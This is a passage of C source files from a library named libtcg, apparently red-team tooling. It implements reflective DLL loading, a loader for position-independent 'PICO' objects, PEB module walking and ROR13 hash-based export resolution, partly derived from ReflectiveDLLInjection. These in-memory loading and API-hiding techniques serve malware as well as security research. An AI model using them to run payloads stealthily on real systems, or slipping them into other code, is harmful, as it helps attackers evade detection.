			 * https://doxygen.reactos.org/de/de3/dll_2win32_2kernel32_2client_2loader_8c.html#a0f3819de0cdab6061ec9e3432a85bf85
			 */
			importByOrdinal = IMAGE_ORDINAL(originalFirstThunk->u1.Ordinal);
			DEREF(firstThunk) = (ULONG_PTR)funcs->GetProcAddress(hLib, (char *)importByOrdinal);
		}
		/* OK, we are doing an import by name. */
		else {
			importByName      = (IMAGE_IMPORT_BY_NAME *)PTR_OFFSET( dst, firstThunk->u1.AddressOfData );
			DEREF(firstThunk) = (ULONG_PTR)funcs->GetProcAddress(hLib, (char *)importByName->Name);
		}

		/* increment our pointers, to look at next import option */
		firstThunk++;
		if (originalFirstThunk)
			originalFirstThunk++;
	}
}

void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst) {
	IMAGE_DATA_DIRECTORY    * importTableHdr;
	IMAGE_IMPORT_DESCRIPTOR * importDesc;

	/* grab our header for the import table */
	importTableHdr = GetDataDirectory(dll, IMAGE_DIRECTORY_ENTRY_IMPORT);

	/* start with the first function of our import table, we're working solely from our destination memory now */
	importDesc = (IMAGE_IMPORT_DESCRIPTOR *)PTR_OFFSET(dst, importTableHdr->VirtualAddress);

	/* walk our import table and process each of the entries */
	while (importDesc->Name) {
		ProcessImport(funcs, dll, dst, importDesc);
		importDesc++;
	}
}

void LoadSections(DLLDATA * dll, char * src, char * dst) {
	DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
	void                  * sectionDst       = NULL;
	void                  * sectionSrc       = NULL;

	/* our first section! */
	sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

	for (int x = 0; x < numberOfSections; x++) {
		/* our source data to copy from */
		sectionSrc = src + sectionHdr->PointerToRawData;

		/* our destination data */
		sectionDst = dst + sectionHdr->VirtualAddress;

		/* copy our section data over */
		__movsb((unsigned char *)sectionDst, (unsigned char *)sectionSrc, sectionHdr->SizeOfRawData);
		//__builtin_memcpy(sectionDst, sectionSrc, sectionHdr->SizeOfRawData);

		/* advance to our next section */
		sectionHdr++;
	}
}

void ParseDLL(char * src, DLLDATA * data) {
	data->DosHeader      = (IMAGE_DOS_HEADER *)src;
	data->NtHeaders      = (IMAGE_NT_HEADERS *)(src + data->DosHeader->e_lfanew);
	data->OptionalHeader = (IMAGE_OPTIONAL_HEADER *)&(data->NtHeaders->OptionalHeader);
}

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base) {
	return (DLLMAIN_FUNC)PTR_OFFSET(base, dll->OptionalHeader->AddressOfEntryPoint);
}

DWORD SizeOfDLL(DLLDATA * data) {
	return data->OptionalHeader->SizeOfImage;
}

void LoadDLL(DLLDATA * dll, char * src, char * dst) {
	/* copy our headers over to the destination address, if we wish */
	__movsb((unsigned char *)dst, (unsigned char *)src, dll->OptionalHeader->SizeOfHeaders);

	/* load our section data */
	LoadSections(dll, src, dst);

	/* process our relocations */
	ProcessRelocations(dll, src, dst);
}

```

## File: libtcg/src/loaderdefs.h

```h
/*
 * Copyright (c) 2011/2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification, are permitted
 * provided that the following conditions are met:
 *
 * * Redistributions of source code must retain the above copyright notice, this list of
 *   conditions and the following disclaimer.
 *
 * * Redistributions in binary form must reproduce the above copyright notice, this list of
 *   conditions and the following disclaimer in the documentation and/or other materials provided
 *   with the distribution.
 *
 * * Neither the name of Harmony Security nor the names of its contributors may be used to
 *   endorse or promote products derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
 * FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

/*
 * This file is derived from ReflectiveLoader.h from Stephen Fewer's ReflectiveDLLInjection project.
 * A few items were removed, but otherwise, this should largely be unchanged.
 *
 * https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.h
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <intrin.h>

#define HASH_KEY 13
//===============================================================================================//
#ifndef __MINGW32__
#pragma intrinsic( _rotr )
#endif

__forceinline DWORD ror( DWORD d )
{
	return _rotr( d, HASH_KEY );
}

__forceinline DWORD hash( char * c )
{
    register DWORD h = 0;
	do
	{
		h = ror( h );
        h += *c;
	} while( *++c );

    return h;
}
//===============================================================================================//
typedef struct _UNICODE_STR
{
  USHORT Length;
  USHORT MaximumLength;
  PWSTR pBuffer;
} UNICODE_STR, *PUNICODE_STR;

// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
//__declspec( align(8) )
typedef struct _LDR_DATA_TABLE_ENTRY
{
	//LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first entry.
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STR FullDllName;
	UNICODE_STR BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// WinDbg> dt -v ntdll!_PEB_LDR_DATA
typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
{
   DWORD dwLength;
   DWORD dwInitialized;
   LPVOID lpSsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

// WinDbg> dt -v ntdll!_PEB_FREE_BLOCK
typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
{
   struct _PEB_FREE_BLOCK * pNext;
   DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

// struct _PEB is defined in Winternl.h but it is incomplete
// WinDbg> dt -v ntdll!_PEB
typedef struct __PEB // 65 elements, 0x210 bytes
{
   BYTE bInheritedAddressSpace;
   BYTE bReadImageFileExecOptions;
   BYTE bBeingDebugged;
   BYTE bSpareBool;
   LPVOID lpMutant;
   LPVOID lpImageBaseAddress;
   PPEB_LDR_DATA pLdr;
   LPVOID lpProcessParameters;
   LPVOID lpSubSystemData;
   LPVOID lpProcessHeap;
   PRTL_CRITICAL_SECTION pFastPebLock;
   LPVOID lpFastPebLockRoutine;
   LPVOID lpFastPebUnlockRoutine;
   DWORD dwEnvironmentUpdateCount;
   LPVOID lpKernelCallbackTable;
   DWORD dwSystemReserved;
   DWORD dwAtlThunkSListPtr32;
   PPEB_FREE_BLOCK pFreeList;
   DWORD dwTlsExpansionCounter;
   LPVOID lpTlsBitmap;
   DWORD dwTlsBitmapBits[2];
   LPVOID lpReadOnlySharedMemoryBase;
   LPVOID lpReadOnlySharedMemoryHeap;
   LPVOID lpReadOnlyStaticServerData;
   LPVOID lpAnsiCodePageData;
   LPVOID lpOemCodePageData;
   LPVOID lpUnicodeCaseTableData;
   DWORD dwNumberOfProcessors;
   DWORD dwNtGlobalFlag;
   LARGE_INTEGER liCriticalSectionTimeout;
   DWORD dwHeapSegmentReserve;
   DWORD dwHeapSegmentCommit;
   DWORD dwHeapDeCommitTotalFreeThreshold;
   DWORD dwHeapDeCommitFreeBlockThreshold;
   DWORD dwNumberOfHeaps;
   DWORD dwMaximumNumberOfHeaps;
   LPVOID lpProcessHeaps;
   LPVOID lpGdiSharedHandleTable;
   LPVOID lpProcessStarterHelper;
   DWORD dwGdiDCAttributeList;
   LPVOID lpLoaderLock;
   DWORD dwOSMajorVersion;
   DWORD dwOSMinorVersion;
   WORD wOSBuildNumber;
   WORD wOSCSDVersion;
   DWORD dwOSPlatformId;
   DWORD dwImageSubsystem;
   DWORD dwImageSubsystemMajorVersion;
   DWORD dwImageSubsystemMinorVersion;
   DWORD dwImageProcessAffinityMask;
   DWORD dwGdiHandleBuffer[34];
   LPVOID lpPostProcessInitRoutine;
   LPVOID lpTlsExpansionBitmap;
   DWORD dwTlsExpansionBitmapBits[32];
   DWORD dwSessionId;
   ULARGE_INTEGER liAppCompatFlags;
   ULARGE_INTEGER liAppCompatFlagsUser;
   LPVOID lppShimData;
   LPVOID lpAppCompatInfo;
   UNICODE_STR usCSDVersion;
   LPVOID lpActivationContextData;
   LPVOID lpProcessAssemblyStorageMap;
   LPVOID lpSystemDefaultActivationContextData;
   LPVOID lpSystemAssemblyStorageMap;
   DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

typedef struct
{
	WORD	offset:12;
	WORD	type:4;
} IMAGE_RELOC, *PIMAGE_RELOC;

```

## File: libtcg/src/picorun.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "loaderdefs.h"
#include "tcg.h"

typedef struct {
	int codeLength;
	int dataLength;
	int rsrcOffset;
	int entryAddress;
} PICO_HDR;

#define FIRST_PICO_DIRECTIVE(x) (PICO_DIRECTIVE_HDR *)((void *)x + sizeof(PICO_HDR))
#define NEXT_PICO_DIRECTIVE(x)  (PICO_DIRECTIVE_HDR *)((void *)x + x->length);

#define PICO_INST_COMPLETE   0x0
#define PICO_INST_PATCH      0x1
#define PICO_INST_COPY       0x2
#define PICO_INST_LL         0x3
#define PICO_INST_GPA        0x4
#define PICO_INST_PATCH_DIFF 0x5
#define PICO_INST_PATCH_FUNC 0x6
#define PICO_INST_EXPORT     0x7

#define PICO_PATCH_TEXT_TEXT 0x0
#define PICO_PATCH_TEXT_BASE 0x1
#define PICO_PATCH_BASE_TEXT 0x2
#define PICO_PATCH_BASE_BASE 0x3

#define PICO_PATCHF_FUNC     0x0

#define PICO_CONTEXT_CODE    0x5
#define PICO_CONTEXT_DATA    0x6

#define PICO_TAG_PDATA 7

typedef struct {
	char  type;
	char  option;
	short length;
} PICO_DIRECTIVE_HDR;

typedef struct {
	PICO_DIRECTIVE_HDR hdr;
	int offset;
} PICO_DIRECTIVE_PATCH;

typedef struct {
	PICO_DIRECTIVE_HDR hdr;
	int src_offset;
	int dst_offset;
	int total;
} PICO_DIRECTIVE_COPY;

typedef struct {
	PICO_DIRECTIVE_HDR hdr;
	int tag;
	int offset;
} PICO_DIRECTIVE_EXPORT;

typedef void (*PICOMAIN_FUNC)(char * arg);

char * _PicoGetResource(char * src, char * base, int tag) {
	PICO_DIRECTIVE_HDR    * entry;
	PICO_DIRECTIVE_EXPORT * export;
	PICO_HDR              * hdr = (PICO_HDR *)src;

	entry = FIRST_PICO_DIRECTIVE(hdr);
	while (TRUE) {
		if (entry->type == PICO_INST_EXPORT) {
			export = (PICO_DIRECTIVE_EXPORT *)entry;
			if (export->tag == tag)
				return (char *)( base + export->offset );
		}
		else if (entry->type == PICO_INST_COMPLETE) {
			return NULL;
		}

		entry = NEXT_PICO_DIRECTIVE(entry);
	}
}

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag) {
	return (PICOMAIN_FUNC)_PicoGetResource(src, base, tag);
}

_RESOURCE * PicoGetUnwindData(char * src, char * base) {
	return (_RESOURCE *)_PicoGetResource(src, base, PICO_TAG_PDATA);
}

PICOMAIN_FUNC PicoEntryPoint(char * src, char * base) {
	PICO_HDR * hdr = (PICO_HDR *)src;

	if (hdr->entryAddress >= 0)
		return (PICOMAIN_FUNC)( (char *)base + hdr->entryAddress );
	else
		return NULL;
}

int PicoCodeSize(char * src) {
	return ( (PICO_HDR *)src )->codeLength;
}

int PicoDataSize(char * src) {
	return ( (PICO_HDR *)src )->dataLength;
}

void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData) {
	PICO_DIRECTIVE_HDR   * entry;
	PICO_DIRECTIVE_PATCH * patch;
	PICO_DIRECTIVE_COPY  * copy;
	HANDLE                 module  = NULL;
	char                 * address = NULL;
	PICO_HDR             * hdr = (PICO_HDR *)src;

	entry = FIRST_PICO_DIRECTIVE(hdr);
	while (TRUE) {
		/*
		 * The heart and soul of PICO loading. Patching pointers into our destination blob
		 * to make sure everything works as hoped and expected. x86 doesn't do indirect addressing
		 * so there's a lot more patches there. But x64 needs some pointer patching too.
		 */
		if (entry->type == PICO_INST_PATCH) {
			ULONG_PTR   value = 0;
			ULONG_PTR   src   = 0;
			patch = (PICO_DIRECTIVE_PATCH *)entry;

			if (entry->option == PICO_PATCH_TEXT_TEXT) {
				src   = (ULONG_PTR)dstCode;
				value = (ULONG_PTR)dstCode;
			}
			else if (entry->option == PICO_PATCH_TEXT_BASE) {
				src   = (ULONG_PTR)dstCode;
				value = (ULONG_PTR)dstData;
			}
			else if (entry->option == PICO_PATCH_BASE_TEXT) {
				src   = (ULONG_PTR)dstData;
				value = (ULONG_PTR)dstCode;
			}
			else if (entry->option == PICO_PATCH_BASE_BASE) {
				src   = (ULONG_PTR)dstData;
				value = (ULONG_PTR)dstData;
			}

			/* get the existing offset (from whatever base) within the .text section */
			value += *(ULONG_PTR *)(src + patch->offset);

			/* set it back */
			*(ULONG_PTR *)(src + patch->offset) = value;
		}
		/*
		 * This block is for updating our function table sitting in our data section. We're
		 * either dumping the last resolved address at some specific slot OR we're pulling in
		 * a pre-determined internal API (which is presumed to be an overloaded IMPORTFUNCS
		 * structure... which we're treating as an array of function pointers basically)
		 */
		else if (entry->type == PICO_INST_PATCH_FUNC) {
			ULONG_PTR value;
			patch = (PICO_DIRECTIVE_PATCH *)entry;

			if (entry->option == PICO_PATCHF_FUNC) {
				value = (ULONG_PTR)address;
			}
			else {
				ULONG_PTR * table = (ULONG_PTR *)funcs;
				value = table[entry->option - 1];
			}

			*(ULONG_PTR *)(dstData + patch->offset) = value;
		}
		/*
		 * This is here to support keeping code + data in separate regions in x64 builds.
		 */
#ifdef WIN_X64
		else if (entry->type == PICO_INST_PATCH_DIFF) {
			DWORD value;
			patch = (PICO_DIRECTIVE_PATCH *)entry;

			/* fetch the value currently at the patch address */
			value   = *(DWORD *)(dstCode + patch->offset);

			/* adjust the value */
			value  += (ULONG_PTR)dstData - (ULONG_PTR)dstCode;

			/* set it back */
			*(DWORD *)(dstCode + patch->offset) = value;
		}
#endif
		/*
		 * Directive copies from our packed src to our destination. We do it this way to allow
		 * our .text section to pack down to its raw value and we expand it to its page-aligned
		 * size after.
		 */
		else if (entry->type == PICO_INST_COPY) {
			copy  = (PICO_DIRECTIVE_COPY *)entry;
			char * dst;

			/* make sure we're copying to the right context */
			if (entry->option == PICO_CONTEXT_CODE)
				dst = dstCode;
			else
				dst = dstData;

			/* do our copy */
			__movsb((unsigned char *)dst + copy->dst_offset, (unsigned char *)src + hdr->rsrcOffset + copy->src_offset, copy->total);
		}
		/*
		 * Directive does a LoadLibraryA() to set our handle. Used as a precursor to any
		 * GetProcAddress lookups based on this later on.
		 */
		else if (entry->type == PICO_INST_LL) {
			char * arg = (char *)entry + sizeof(PICO_DIRECTIVE_HDR);
			module = funcs->LoadLibraryA(arg);
		}
		/*
		 * Call GetProcAddress on an argument. A precursor to a PATCH_FUNC instruction to push
		 * this pointer to the appropriate spot within our PICO blob.
		 */
		else if (entry->type == PICO_INST_GPA) {
			char * arg = (char *)entry + sizeof(PICO_DIRECTIVE_HDR);
			address = (char *)funcs->GetProcAddress(module, arg);
		}
		/*
		 * An instruction to indicate the loading is complete and we should return.
		 */
		else if (entry->type == PICO_INST_COMPLETE) {
			return;
		}

		entry = NEXT_PICO_DIRECTIVE(entry);
	}
}

```

## File: libtcg/src/resolve_eat.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "loaderdefs.h"
#include "tcg.h"

/*
 * We've abstracted our hashing logic into these functions. Why? Use redirect to replace them :)
 */

DWORD hash_module(char * name, USHORT counter) {
	DWORD hashValue = 0;

	do {
		hashValue = ror(hashValue);
		if (*name >= 'a')
			hashValue += (BYTE)*name - 0x20;
		else
			hashValue += (BYTE)*name;

		name++;
	} while (--counter);

	return hashValue;
}

DWORD hash_function(char * value) {
	return hash(value);
}

/*
 * Walk the Export Address Table to resolve functions by hash
 */

HANDLE findModuleByHash(DWORD moduleHash) {
	_PEB                 * pPEB;
	LDR_DATA_TABLE_ENTRY * pEntry;
	char                 * name;
	DWORD                  hashValue;
	USHORT                 counter;

	/* get the Process Enviroment Block */
#if defined WIN_X64
	pPEB = (_PEB *)__readgsqword( 0x60 );
#elif defined WIN_X86
	pPEB = (_PEB *)__readfsdword( 0x30 );
#else
#error "Neither WIN_X64 or WIN_X86 is defined"
#endif

	/* walk the module list */
	pEntry = (LDR_DATA_TABLE_ENTRY *)pPEB->pLdr->InMemoryOrderModuleList.Flink;

	while (pEntry) {
		/* pEntry->BaseDllName is a UNICODE_STRING, pBuffer is wchar_t*, and Length is IN bytes.
		   We are walking and hashing this string, one byte at a time */
		name      = (char *)pEntry->BaseDllName.pBuffer;
		counter   = pEntry->BaseDllName.Length;

		/* calculate the hash of our DLL name */
		hashValue = hash_module(name, counter);

		/* if we have a match, return it */
		if (hashValue == moduleHash)
			return (HANDLE)pEntry->DllBase;

		/* next entry */
		pEntry = (LDR_DATA_TABLE_ENTRY *)pEntry->InMemoryOrderModuleList.Flink;
	}

	return NULL;
}

BOOL isForwardedFunction(IMAGE_DATA_DIRECTORY * exportTableHdr, DWORD functionRVA) {
	return functionRVA >= exportTableHdr->VirtualAddress && functionRVA < (exportTableHdr->VirtualAddress + exportTableHdr->Size);
}

__attribute__((optimize("no-omit-frame-pointer"))) FARPROC findFunctionByHash(HANDLE src, DWORD wantedFunction) {
	DLLDATA                  data;
	IMAGE_DATA_DIRECTORY   * exportTableHdr;
	IMAGE_EXPORT_DIRECTORY * exportDir;
	DWORD                  * exportName;
	WORD                   * exportOrdinal;
	DWORD                  * exportAddress;
	DWORD                    hashValue;

	/* parse our DLL! */
	ParseDLL(src, &data);

	/* grab our export directory */
	exportTableHdr = GetDataDirectory(&data, IMAGE_DIRECTORY_ENTRY_EXPORT);
	exportDir      = (IMAGE_EXPORT_DIRECTORY *)PTR_OFFSET(src, exportTableHdr->VirtualAddress);

	/* walk the array of exported names/address ordinals */
	exportName    = (DWORD *)PTR_OFFSET(src, exportDir->AddressOfNames);
	exportOrdinal = (WORD *) PTR_OFFSET(src, exportDir->AddressOfNameOrdinals);

	while (TRUE) {
		hashValue = hash_function( (char *)PTR_OFFSET(src, *exportName) );
		if (hashValue == wantedFunction) {
			/* figure out the base of our AddressOfFunctions array */
			exportAddress   = PTR_OFFSET(src, exportDir->AddressOfFunctions);

			/* increment it by the current value of our exportOrdinal array */
			exportAddress  += *exportOrdinal;

			/* if it's a forwarded function, we're better off letting the OS-resolver figure this one out */
			if (isForwardedFunction(exportTableHdr, *exportAddress)) {
				/* in a TCG/CPL context, this is OK, because DFR will catch this call to GetProcAddress and fix it */
				return GetProcAddress((HMODULE)src, (char *)PTR_OFFSET(src, *exportName));
			}
			/* and... there-in is our virtual address to the actual ptr we want */
			else {
				return (FARPROC)PTR_OFFSET(src, *exportAddress);
			}
		}

		exportName++;
		exportOrdinal++;
	}
}

```

## File: libtcg/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: libtcg/src/util.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include <intrin.h>
#include "tcg.h"

/*
 * Adler32 checksum to check if our decrypted data is what we likely intended.
 * https://www.ietf.org/rfc/rfc1950.txt
 */
DWORD adler32sum(unsigned char * buffer, DWORD length) {
	DWORD a = 1, b = 0;

	for (int x = 0; x < length; x++) {
		a = (a + buffer[x]) % 65521;
		b = (a + b) % 65521;
	}

	return (b << 16) + a;
}

/*
 * ROR13 hashing algorithm. From Stephewn Fewer's ReflectiveDLLInjection
 */
#ifndef __MINGW32__
